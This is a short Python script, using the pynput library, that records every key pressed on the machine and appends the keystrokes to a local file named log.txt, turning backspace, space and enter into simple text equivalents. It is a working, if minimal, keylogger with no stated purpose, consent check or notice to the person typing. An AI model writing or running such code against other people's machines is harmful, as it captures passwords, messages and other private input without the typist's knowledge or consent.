import pynput
from pynput.keyboard import Listener


def write_file(key):
    k = str(key).replace("'", "")
    if k == "Key.backspace":
        k = ''
    if k == "Key.space":
        k = ' '
    if k == "Key.enter":
        k = "\n"
        
    
    with open("log.txt", "a") as f:
            f.write(k)
        
    

with Listener(on_press=write_file) as listener:
    listener.join()
